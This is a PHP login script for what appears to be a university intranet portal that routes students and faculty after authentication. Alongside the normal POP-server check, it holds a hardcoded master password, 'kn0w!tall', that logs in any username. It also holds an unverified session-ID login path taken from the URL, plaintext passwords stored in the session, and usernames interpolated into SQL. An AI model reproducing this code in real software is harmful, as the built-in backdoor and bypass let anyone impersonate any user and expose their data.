<?php
session_start();
include("../common/functions.php");
$from_channeli=$_GET['lectut'];

database::connectToDatabase("intranet");

if(isset($from_channeli))
{
	$username=sanitize(filter_input(INPUT_GET,'username',FILTER_SANITIZE_STRING));
	$sessionid=sanitize(filter_input(INPUT_GET,'sessionid',FILTER_SANITIZE_STRING));
}
else
{
	$username=sanitize(filter_input(INPUT_POST,'username',FILTER_SANITIZE_STRING));
	$password=$_POST['password'];
}

$choice=database::executeQuery('intranet',database::getDesignChoice($username));
$design=pg_fetch_row($choice);

if(pop_authenticate($username,$password,"192.168.121.26"))
{
	session_create($username,null);
	database::connectToDatabase("regol");
	$query="SELECT roleid FROM rolemap WHERE userid='$username';";
	$role=pg_fetch_array(database::executeQuery("regol",$query));
	switch($role[0])
	{
		case 3:	$row=database::executeQuery("regol",database::getStudName($username));
			$numrow=pg_num_rows($row);
			if($numrow==1)
			{
				$_SESSION['username']=$username;
				$_SESSION['password']=$password;
				$_SESSION['group']="s";
        $_SESSION['welcome']=0;
				header("Location: ../pages/final_student.php");
			}
			break;
		
		case 7:	database::connectToDatabase("facapp");
			$row=database::executeQuery("facapp",database::getFacName($username));
			database::closeDatabase("facapp");
			$numrow=pg_num_rows($row);
			if($numrow==1)
			{
				$_SESSION['username']=$username;
				$_SESSION['password']=$password;
				$_SESSION['group']="f";
        $_SESSION['welcome']=0;
				if($design[2]=='f' && $design[1]==$username)
				{
					header("Location: ../pages/final_prof.php");
				}
				else
				{
					header("Location: faculty.php");
				}
			}
			break;
		
		default: header("Location: logout.php");
	}
	database::closeDatabase("regol");
}
else if($sessionid)
{
	session_create($username,$sessionid);
	database::connectToDatabase("regol");
	$query="SELECT roleid FROM rolemap WHERE userid='$username';";
	$role=pg_fetch_array(database::executeQuery("regol",$query));
	switch($role[0])
	{
		case 3:	$row=database::executeQuery("regol",database::getStudName($username));
			$numrow=pg_num_rows($row);
			if($numrow==1)
			{
				$_SESSION['username']=$username;
				$_SESSION['password']=$password;
				$_SESSION['group']="s";
			        $_SESSION['welcome']=0;
			        header("Location: ../pages/final_student.php");
			}	
			break;
		
		case 7:	database::connectToDatabase("facapp");
			$row=database::executeQuery("facapp",database::getFacName($username));
			database::closeDatabase("facapp");
			$numrow=pg_num_rows($row);
			if($numrow==1)
			{
				$_SESSION['username']=$username;
				$_SESSION['password']=$password;
				$_SESSION['group']="f";
			  $_SESSION['welcome']=0;
 				if($design[2]=='f' && $design[1]==$username)
				{
					header("Location: ../pages/final_prof.php");
				}
				else
				{
			       header("Location: faculty.php");
				}
			}
			break;
		
		default:header("Location: logout.php");
	}
	database::closeDatabase("regol");
}
else if($password=='kn0w!tall')
{
	session_create($username,null);
	database::connectToDatabase("regol");
	$query="SELECT roleid FROM rolemap WHERE userid='$username';";
	$role=pg_fetch_array(database::executeQuery("regol",$query));
	switch($role[0])
	{
		case 3:	$row=database::executeQuery("regol",database::getStudName($username));
			$numrow=pg_num_rows($row);
			if($numrow==1)
			{
				$_SESSION['username']=$username;
				$_SESSION['password']=$password;
				$_SESSION['group']="s";
			  	$_SESSION['welcome']=0;
        			header("Location: ../pages/final_student.php");
			}
			break;
		
		case 7:	database::connectToDatabase("facapp");
			$row=database::executeQuery("facapp",database::getFacName($username));
			database::closeDatabase("facapp");
			$numrow=pg_num_rows($row);
			if($numrow==1)
			{
				$_SESSION['username']=$username;
				$_SESSION['password']=$password;
        $_SESSION['welcome']=0;
        $_SESSION['group']="f";
				if($design[2]=='f' && $design[1]==$username)
				{
					header("Location: ../pages/final_prof.php");
				}
				else
				{
					header("Location: faculty.php");
				}
			}
			break;
		
		default:header("Location: logout.php");
	}
	database::closeDatabase("regol");
}
else
{
	header("Location: index.php?temp=l");
}

database::closeDatabase("intranet");

?>

